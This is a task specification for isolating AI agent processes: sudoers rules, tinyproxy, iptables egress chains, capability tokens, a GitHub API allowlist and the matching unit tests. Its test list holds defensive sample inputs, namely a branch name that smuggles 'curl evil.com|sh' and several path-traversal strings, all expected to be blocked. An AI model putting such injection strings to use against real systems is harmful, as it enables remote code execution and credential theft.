# Agent Process Isolation & Credential Hardening — Tasks

## ROADMAP Item Grouping

- **Item 83 (A)**: Setup script (user, sudoers, token hardening, proxy, iptables, askpass helper)
- **Item 84 (B)**: Core wiring (config, agent-server.ts, spawn change, session cap_token,
  per-session clone model via worktree-manager.ts)
- **Item 85 (C)**: MCP changes (remove git_credential, github_forward relay with raw path
  validation + repo scope, push_branch with bundle handoff, pr tools)
- **Item 86 (D)**: Startup checks, ClaudeCodeAdapter block, docs, Tier 2 tests

Order: 83 → 84 → 85 → 86.

---

## Item 83: Setup script + infrastructure

### Task 83.1: Write `scripts/setup-agent-user.sh`

Idempotent bash script, runs as root. Steps:

1. Create `agentworker` with home dir at `/home/agentworker`:
   `id -u agentworker &>/dev/null || useradd -r -s /usr/sbin/nologin -d /home/agentworker -m agentworker`

2. Write `/etc/sudoers.d/agent-router-worker` (mode 440) from `$KIRO_PATH`:
   - `AGENT_ROUTER_SESSION_ID`, `WORKDIR`, `AGENT_ROUTER_AGENT_SOCK`, `AGENT_ROUTER_CAP_TOKEN`,
     `HTTPS_PROXY` in `env_keep`
   - `NOPASSWD: $KIRO_PATH acp`
   - Validate with `visudo -c -f`

3. Harden `$rootDir` and token files (mode 600, `agentrouter` owner):
   `chmod 750 $ROOTDIR; chmod 600 $ROOTDIR/tokens.json $ROOTDIR/daemon-token $ROOTDIR/config.json`

4. Create `/srv/agent-router/worktrees/` (mode **2755** = setgid+0755, `agentrouter:agentworker`):
   `install -d -o agentrouter -g agentworker -m 2755 /srv/agent-router/worktrees`
   The setgid bit ensures new `{sid}/` directories created by the daemon inherit the `agentworker`
   group, making seed.bundle mode 0640 readable by agentworker without `chgrp`.

5. Create `/run/agent-router/` via `tmpfiles.d` (mode **2750** = setgid+0750, `agentrouter:agentworker`):
   `echo 'd /run/agent-router 2750 agentrouter agentworker -' > /etc/tmpfiles.d/agent-router.conf`
   The setgid bit ensures sockets created in the dir by the daemon (running as `agentrouter`)
   inherit the `agentworker` group, so mode 0660 sockets are reachable by `agentworker`.

6. Write fixed root-owned wrapper scripts and install them:
   - `/usr/local/libexec/agent-router-seed-clone` (root:root 0755) — `git clone` for seeding per design §D
   - `/usr/local/libexec/agent-router-rm-session` (root:root 0755) — `rm -rf {sid}/` with path validation

7. Add sudoers rules for wrapper scripts and pkill to `/etc/sudoers.d/agent-router-worker`:
   ```
   agentrouter ALL=(root) NOPASSWD: /usr/local/libexec/agent-router-seed-clone *
   agentrouter ALL=(root) NOPASSWD: /usr/local/libexec/agent-router-rm-session *
   agentrouter ALL=(root) NOPASSWD: /usr/bin/pkill -KILL -u agentworker
   # Read-only git inspection of agentworker work/ for daemon
   agentrouter ALL=(agentworker) NOPASSWD: /usr/bin/git -C /srv/agent-router/worktrees/* rev-parse HEAD
   agentrouter ALL=(agentworker) NOPASSWD: /usr/bin/git -C /srv/agent-router/worktrees/* log --format\=* -n *
   ```
   Note on pkill: FR-4.7 requires guarding with `getActiveWorkerSessionCount() <= 1` before
   calling — never call with concurrent sessions active (see design §C).

8. Install and configure tinyproxy (Task 83.2)

9. Install iptables rules atomically (Task 83.3)

10. Print summary and instructions for operator

Requirements: FR-1.1, FR-2.1, FR-3.1, FR-3.4, FR-3.5, FR-4.2, FR-7.1–7.3

### Task 83.2: tinyproxy configuration

Install tinyproxy. Write `/etc/tinyproxy/tinyproxy.conf` and `/etc/tinyproxy/filter` as
specified in design §F. Enable and start `tinyproxy.service`.
**Do NOT** add non-idempotent `-A OUTPUT` rules directly in this task. Instead, implement
`setup_tinyproxy_ssrf_rules()` (design §F suffix) which creates a dedicated `TPROXY_SSRF_BLOCK`
chain — this function is called from `setup_iptables()` (Task 83.3) BEFORE the save step, so
both chains end up persisted in `agent-router-rules.v4/v6`.

Requirements: FR-7.1

### Task 83.3: iptables rules

Implement `setup_iptables()` function in `setup-agent-user.sh` as per design §C:
- Build IPv4 chain rules in a tempfile (ONLY `:AGENTWORKER_OUT - [0:0]` and its rules, NO
  built-in policy lines `:INPUT` / `:FORWARD` / `:OUTPUT`)
- Apply with `iptables-restore --noflush`
- Install jump rule idempotently with `iptables -C ... || iptables -I OUTPUT 1 ...`
- **Call `setup_tinyproxy_ssrf_rules()`** (Task 83.2) before the save step to build the
  `TPROXY_SSRF_BLOCK` chain
- Mirror with `ip6tables-restore --noflush` (default DROP chain + TPROXY_SSRF_BLOCK for IPv6)
- NO explicit DNS allow rule (proxy handles DNS, blocking direct DNS prevents tunnelling)
- **Persist BOTH chains** in `agent-router-rules.v4` and `agent-router-rules.v6` as shown in
  design §G — include `:AGENTWORKER_OUT - [0:0]` AND `:TPROXY_SSRF_BLOCK - [0:0]` in the header
- Install systemd unit `agent-router-iptables.service` that restores **both** files on boot:
  ```ini
  [Unit]
  Description=Restore agent-router iptables rules
  Before=agent-router.service
  After=network.target
  DefaultDependencies=no

  [Service]
  Type=oneshot
  ExecStart=/sbin/iptables-restore --noflush /etc/iptables/agent-router-rules.v4
  ExecStart=/sbin/ip6tables-restore --noflush /etc/iptables/agent-router-rules.v6
  RemainAfterExit=yes

  [Install]
  WantedBy=multi-user.target
  ```

Requirements: FR-7.2, FR-7.4

### Task 83.4: README "Security Setup" section

Document prerequisites, setup command, what it does, how to enable (`useWorkerUid: true`),
and AC-1 through AC-10 verification commands.

Requirements: FR-1.2

---

## Item 84: Core wiring — config, agent-server, spawn, session cap-token

### Task 84.1: Add config fields in `src/config.ts`

Add to `AgentRouterConfig`:
- `useWorkerUid?: boolean` (default `false`)
- `worktreeBase?: string` (default `/srv/agent-router/worktrees`)
- `agentSocketPath?: string` (default `/run/agent-router/agent.sock`)
- `githubForwardAllowList?: Array<{ methods: string[]; pathPattern: string }>`

### Task 84.2: Add `SpawnOpts` fields in `src/agent-adapter.ts`

Add:
```typescript
useWorkerUid?: boolean;
capToken?: string;
```

### Task 84.3: Create `src/agent-server.ts`

New file implementing the agent-only socket. Key implementation requirements:

1. Listen on `config.agentSocketPath`. After bind: `fs.chmodSync(path, 0o660)`.

2. For each connection, parse JSON-RPC-like `{ op, session_id, cap_token, ...args }`.

3. Every op calls `validateCapToken(stored, provided)` using `crypto.timingSafeEqual`.
   Empty tokens → reject.

4. Dispatch:
   - `session_status`, `register_pr`, `merge_pr`, `complete_session`, `register_worktree`,
     `report_outcome`, `get_session_project`: forward to existing session manager methods.
   - `github_forward`: daemon-side allowlist + fetch (design §E).
   - `push_branch`: bundle handoff (design §F).
   - `pr_create`, `pr_view`: REST API via existing GitHub client.
   - All others: `{ error: 'Unknown op' }`.

5. `github_forward` path normalisation per design §E: **raw segment validation** (NOT
   decode-then-check). Each segment (split on `/`) must match `^[A-Za-z0-9._-]+$` (plus
   `%2F` only in ref positions). Reject `%`, `?`, `#`, `\`, control chars, empty segments.
   Build URL with `URL` + `URLSearchParams`, run allowlist check on `url.pathname`.

6. `github_forward` allowlist per FR-5.4. Repo authorization: extract owner/repo from path,
   verify against `sessionMgr.getSessionRepo(sessionId)`. PAT from token resolver (NOT from
   agent-supplied `repo` argument).

7. `github_forward` special body checks:
   - `POST /repos/*/pulls` and `pr_create`: parse body JSON, reject if `base` is `main` or
     `master` (NOT `development` — that is the intended PR target).
   - `PATCH /repos/*/pulls/{n}`: accept only `{title, body}` keys, reject all others.
   - `POST /repos/*/issues/{n}/comments`: record returned `id` in `outbound_comments` table.

8. `push_branch` validation per FR-6.1. Uses `execFile` with array args. No shell interpolation.
   - Read bundle with `O_RDONLY | O_NOFOLLOW | O_NONBLOCK`, `fstat` for type+size, read exactly
     `stat.size` bytes, write to `mkdtemp` dir (always cleaned up in `finally`).
   - Implement the ordered steps from FR-6.1 step 7: init bare → fetch base branch → bundle verify
     (inside repo, after base is available) → fetch bundle → tree-SHA .github comparison
     (named refs only, per FR-6.1 step 6; do NOT use path-prefix matching against `.github/`).
   - Credential via `GIT_ASKPASS_PASSWORD` env var + fixed helper at
     `/usr/local/libexec/agent-router-askpass` (root:root 0755, never written to disk).

9. `fetch` calls use `redirect: 'manual'`.

### Task 84.4: Modify `KiroAdapter.spawn()` in `src/adapters/kiro.ts`

When `opts.useWorkerUid: true`:
- `spawnFn('/usr/bin/sudo', ['-u', 'agentworker', deps.kiroPath, 'acp'], env)`
- `env` includes: all of `opts.env` minus `GITHUB_TOKEN`, plus:
  `AGENT_ROUTER_SESSION_ID: opts.sessionId`, `AGENT_ROUTER_AGENT_SOCK: deps.agentSocketPath`,
  `AGENT_ROUTER_CAP_TOKEN: opts.capToken ?? ''`, `HTTPS_PROXY: 'http://127.0.0.1:8080'`
- Preserve all existing `buildChildEnv` / `WORKDIR` fields from `opts.env`

When `opts.useWorkerUid: false` (default): unchanged existing behavior.

### Task 84.5: Modify `src/index.ts` acpSpawner lambda

- **Always** generate `capToken = crypto.randomUUID().replace(/-/g, '')` for every session
  (not only when `useWorkerUid: true`). The agent socket is available in both modes.
- Remove `GITHUB_TOKEN` from rawEnv **only** when `useWorkerUid: true`. Log WARNING if present.
- Call `sessionMgr.setCapToken(sessionId, capToken)`.
- Pass `capToken` and `agentSocketPath` to `adapter.spawn()`.
- Pass `AGENT_ROUTER_AGENT_SOCK` + `AGENT_ROUTER_CAP_TOKEN` in `mcpServers[0].env` for
  `session/new` and `session/load` calls.
- **Always** start the agent server at daemon startup (before any sessions are created):
  `createAgentServer(config, sessionMgr, tokenResolver, log)`. Log its socket path at INFO.
  When `useWorkerUid: false`, `config.agentSocketPath` falls back to `path.join(rootDir, 'agent.sock')`
  so the server starts even when the setup script was never run (NFR-4.3).
- Add startup log: `log.info('Process isolation config', { useWorkerUid: config.useWorkerUid ?? false })`.


### Task 84.6: Modify `src/session-mgr.ts`

Add the following methods (FR-4.1, FR-4.6, FR-4.7):
```typescript
setCapToken(sessionId: string, token: string): void;
validateCapToken(sessionId: string, token: string): boolean;  // timingSafeEqual; empty tokens rejected
getSessionRepo(sessionId: string): string | undefined;
getSessionReadRepos(sessionId: string): string[];
getWorktreePath(sessionId: string): string | undefined;
// Returns count of active sessions using useWorkerUid (for pkill guard)
getActiveWorkerSessionCount(): number;
```

Implement `checkConcurrentProjectConflict` (FR-4.6) and call it in `createSession()` AND `resumeSessions()`:
```typescript
function checkConcurrentProjectConflict(
  newRepo: string, activeSessions: SessionInfo[], useWorkerUid: boolean
): void {
  if (!useWorkerUid) return;
  const conflict = activeSessions.find(
    s => s.repo.toLowerCase() !== newRepo.toLowerCase()
  );
  if (conflict) throw new Error(
    `Cannot spawn concurrent sessions for different projects in useWorkerUid mode — stop ${conflict.sessionId} first`
  );
}
```
The `force` flag on `session/new` MUST NOT bypass this check when `useWorkerUid=true`.

Implement guarded pkill in the session cleanup path (FR-4.7):
```typescript
// In session cleanup — check BEFORE removing the session from active list
async function cleanupWorkerSession(sessionId: string): Promise<void> {
  // Remove from active list first so count reflects post-cleanup state
  sessionMgr.markSessionEnded(sessionId);
  if (sessionMgr.getActiveWorkerSessionCount() === 0) {
    // No sibling sessions — safe to reap all agentworker processes
    await execFileAsync('/usr/bin/sudo', ['-n', '/usr/bin/pkill', '-KILL', '-u', 'agentworker'])
      .catch(() => {}); // non-zero exit is ok (no processes to kill)
  }
}
```
Add tier1 tests:
1. `checkConcurrentProjectConflict`: throws on cross-project session, allows same-project session.
2. `force` flag does NOT bypass the refusal when `useWorkerUid=true`.
3. `getActiveWorkerSessionCount()` returns 0 after last session ends.
4. `pkill` is NOT called when `getActiveWorkerSessionCount() > 0`.



### Task 84.7: Update `worktree-manager.ts`

1. Use `config.worktreeBase` instead of `path.join(rootDir, 'worktrees')`.

2. Implement the per-session clone model (design §D):
   - `git bundle create` from bare clone with `CLEAN_GIT_ENV`
   - Create `{sid}/` with `fs.mkdirSync(sessionDir, { mode: 0o750 })` (agentrouter:agentworker)
   - Create `seed.bundle` with mode 0640 so agentworker can read via group
   - `sudo -n /usr/local/libexec/agent-router-seed-clone <sid>` (BASE hardcoded in wrapper)
   - Delete seed bundle after clone

3. Add session teardown calling `sudo -n /usr/local/libexec/agent-router-rm-session <sid>`
   in the session cleanup path. Confirm the `agentworker` process has exited before calling.

4. **C3 CRITICAL — audit every `execFile`/`execFileAsync` call with first arg `'git'` in
   `worktree-manager.ts`, `attempt-runner.ts`, `worktree-ops.ts` (and any other files that
   operate on session state) whose `cwd` or `GIT_DIR` could resolve inside `{worktreeBase}/{sid}/work/`.**
   For each such call:
   - Replace with `sudo -n -u agentworker git <allowlisted-subcommand> ...` (only `status`, `log`,
     `diff`, `show`, `rev-parse`, `cat-file` are safe read operations), OR
   - Remove if equivalent info is available from the daemon's canonical bare clone, OR
   - Document why the call is safe (e.g. it already uses sudo and cannot be hijacked).
   Add a `// DAEMON_GIT_WORKDIR_AUDITED: reason` comment at each verified call site.

5. Add a test that AST-searches `worktree-manager.ts` + `attempt-runner.ts` for
   `execFile('git'...)` or `execFileAsync('git'...)` with `cwd` containing `worktreeBase`
   and fails if any are found without the `DAEMON_GIT_WORKDIR_AUDITED` comment on the preceding line.

### Task 84.8: Unit tests in `test/tier1/kiro-adapter.test.ts`

1. `useWorkerUid: false`: `spawnImpl` called with `(kiroPath, ['acp'], env)`.
2. `useWorkerUid: true`: `spawnImpl` called with `('/usr/bin/sudo', ['-u', 'agentworker', kiroPath, 'acp'], env)`.
3. `useWorkerUid: true` + `GITHUB_TOKEN` in env: env passed to `spawnImpl` has no `GITHUB_TOKEN`.
4. `useWorkerUid: true`: env contains non-empty `AGENT_ROUTER_CAP_TOKEN`.

Requirements: FR-2.4, NFR-1.3

---

## Item 85: MCP tool changes

### Task 85.1: Remove `git_credential` from `src/mcp-server.ts`

Remove from `MCP_TOOLS` and `handleToolsCall`. Assert in test that `tools/list` has no
`git_credential` entry (AC-3).

### Task 85.2: Redesign `github_http_forward` as thin relay

Handler body:
```typescript
case 'github_http_forward': {
  const agentSock = process.env['AGENT_ROUTER_AGENT_SOCK'] ?? process.env['AGENT_ROUTER_SOCKET'] ?? '';
  const capToken = process.env['AGENT_ROUTER_CAP_TOKEN'] ?? '';
  result = await sendToDaemon(agentSock, {
    op: 'github_forward',
    session_id: sessionId,
    cap_token: capToken,
    method: toolArgs['method'],
    path: toolArgs['path'],
    body: toolArgs['body'],
  });
  break;
}
```
Remove: `get_token` call, `githubApiBaseUrl`, `GITHUB_API_BASE_URL`, credential validators.

### Task 85.3: Add `push_branch` MCP tool (thin relay)

Tool definition + relay handler to agent socket `push_branch` op.

### Task 85.4: Add `pr_create` and `pr_view` MCP tools (thin relays)

Tool definitions + relay handlers.

### Task 85.5: Fix `acp.ts` comment

Update the comment at `acp.ts:186-193` (or wherever) that lists MCP tool names: remove
`git_credential`, update tool count.

### Task 85.6: Unit tests

In `test/tier1/mcp-server.test.ts`:
1. `tools/list` has no `git_credential`.
2. `github_http_forward` sends `op:'github_forward'` (not `get_token`) to daemon socket.
3. `push_branch` sends `op:'push_branch'` to daemon socket.

In `test/tier1/agent-server.test.ts` (new):
1. `get_token` op → `{error:"Unknown op"}` (AC-10)
2. Wrong `cap_token` → `{error:"Unauthorized"}`
3. Empty `cap_token` → `{error:"Unauthorized"}`
4. `GET /repos/o/r/pulls/1` → allowed (AC-5)
5. `POST /repos/o/r/hooks` → `{error:"not permitted"}` (AC-4)
6. `GET /repos/o/r/pulls/%2e%2e` → `{error:"not permitted"}` (AC-6)
7. Path `\repos\o\r\hooks` (backslash) → blocked
8. Path `/repos/o/r/pulls/1%5c../hooks` → blocked
9. `PATCH /repos/o/r/pulls/1` with `{base:"main"}` → blocked
10. `PATCH /repos/o/r/pulls/1` with `{title:"fix"}` → allowed
11. `POST /repos/o/r/pulls` with `{base:"main"}` → blocked (main is a protected push-target branch)
12. `push_branch` with `branch:"main"` → `{error:"Protected branch"}`
13. `push_branch` with `branch:"agent/fix"` → allowed (mocked `execFile`)
14. `push_branch` with `branch:"agent/x;curl evil.com|sh"` → blocked (pattern check)
15. `push_branch` with `branch:"agent/x:main"` → blocked (`:` rejected)

---

## Item 86: Startup checks, ClaudeCodeAdapter block, docs, Tier 2 tests

### Task 86.1: Startup checks in `src/index.ts`

```typescript
// Called in main() after loadConfig(), before session manager init:
checkTokenFilePermissions(rootDir, log);  // existing plan, checks mode & 0o044
checkIptablesRules(log);                  // reads /etc/iptables/rules.v4
log.info('Process isolation config', { useWorkerUid: config.useWorkerUid ?? false });
```

`checkIptablesRules` uses `fs.readFileSync('/etc/iptables/agent-router-rules.v4', 'utf-8')` (no `execSync`,
no `CAP_NET_ADMIN`). Checks for string `'AGENTWORKER_OUT'`. Logs WARNING if absent or file
unreadable (AC-7).

### Task 86.2: ClaudeCodeAdapter safe-failure

In acpSpawner lambda or before `adapter.spawn()`:
```typescript
if ((config.useWorkerUid ?? false) && adapter.name === 'claude-code') {
  log.error('useWorkerUid not supported for claude-code adapter — refusing session', { repo });
  throw new Error('useWorkerUid not supported for claude-code adapter');
}
```

### Task 86.3: `docs/security-setup.md`

Operator guide covering:
- Prerequisites and install commands
- Step-by-step setup with expected output
- kiro auth for agentworker: `sudo -u agentworker kiro-cli login`
- Verification commands (AC-1 through AC-10)
- Residual risks and mitigations
- Revert/debug steps (re-enable `useWorkerUid: false`, restore token permissions)

### Task 86.4: Tier 2 tests in `test/tier2/agent-isolation.test.ts`

1. Session spawned with `useWorkerUid: true` does NOT receive `GITHUB_TOKEN` in env.
2. Agent socket exists at `agentSocketPath` with mode that group-members can connect to (0660).
3. Operator socket at `$rootDir/sock` is mode 0600.
4. `github_forward` with disallowed path returns error without executing any GitHub API call.
5. `push_branch` with protected branch name returns error without running any `execFile`.

---

## ROADMAP Entries (to add in this spec's PR)

```markdown
### 83. Agent process isolation — setup script, user, proxy, iptables, rootDir hardening

Read `.kiro/specs/agent-process-isolation/requirements.md`, `design.md`, and `tasks.md` in
full, then implement tasks `83.1`, `83.2`, `83.3`, `83.4`.

- Spec: `.kiro/specs/agent-process-isolation/` · tasks `83.1–83.4`
- [x] Complete · PR: #149

---

### 84. Agent process isolation — config, agent socket, spawn change, cap-token, worktree base

Read `.kiro/specs/agent-process-isolation/requirements.md`, `design.md`, and `tasks.md` in
full, then implement tasks `84.1`, `84.2`, `84.3`, `84.4`, `84.5`, `84.6`, `84.7`, `84.8`.
Depends on item 83 (user, socket dir, worktree dir must exist).

- Spec: `.kiro/specs/agent-process-isolation/` · tasks `84.1–84.8`
- [ ] Complete · PR: --

---

### 85. Agent process isolation — MCP changes (remove git_credential, github_forward relay, push_branch)

Read `.kiro/specs/agent-process-isolation/requirements.md`, `design.md`, and `tasks.md` in
full, then implement tasks `85.1`, `85.2`, `85.3`, `85.4`, `85.5`, `85.6`. Depends on item 84
(agent socket and cap_token in place).

- Spec: `.kiro/specs/agent-process-isolation/` · tasks `85.1–85.6`
- [ ] Complete · PR: --

---

### 86. Agent process isolation — startup checks, ClaudeCodeAdapter block, Tier 2 tests, docs

Read `.kiro/specs/agent-process-isolation/requirements.md`, `design.md`, and `tasks.md` in
full, then implement tasks `86.1`, `86.2`, `86.3`, `86.4`. Depends on items 83, 84, 85.

- Spec: `.kiro/specs/agent-process-isolation/` · tasks `86.1–86.4`
- [ ] Complete · PR: --
```
